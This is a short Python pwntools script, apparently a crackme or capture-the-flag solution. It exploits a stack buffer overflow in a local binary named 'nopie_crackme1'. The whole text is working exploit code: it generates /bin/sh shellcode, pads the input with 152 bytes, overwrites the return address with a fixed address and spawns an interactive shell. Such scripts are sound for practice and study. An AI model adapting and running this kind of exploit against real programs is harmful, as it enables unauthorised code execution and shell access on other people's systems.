from pwn import *

context.update(arch='x86_64', os='linux')
shellcode = asm(shellcraft.sh())

print(shellcode)

q = process('./nopie_crackme1')
payload = b"A" * 152 + p64(0x00000000004005d6) + shellcode
print(payload)
q.sendline(payload)

q.interactive()
